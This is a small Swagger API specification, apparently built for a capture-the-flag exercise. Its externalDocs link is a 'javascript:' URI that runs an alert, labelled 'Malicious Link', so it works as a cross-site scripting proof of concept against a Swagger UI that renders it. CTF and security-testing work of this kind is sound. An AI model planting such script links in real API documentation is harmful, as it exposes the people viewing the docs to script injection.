swaggerVersion: "1.2"  # Changing to 1.2 as referenced in your output
info:
  version: "2.0.0"
  title: "CTF Swagger API"
  description: "payload"
host: "api.mrgreen.com"
schemes:
  - "https"
paths:
  /example:
    get:
      summary: "Example Endpoint"
      description: "Click the link to trigger the payload."
      responses:
        200:
          description: "Successful Response"
          schema:
            type: "string"
      externalDocs:
        description: "Malicious Link"
        url: "javascript:alert('XSS Exploit')"
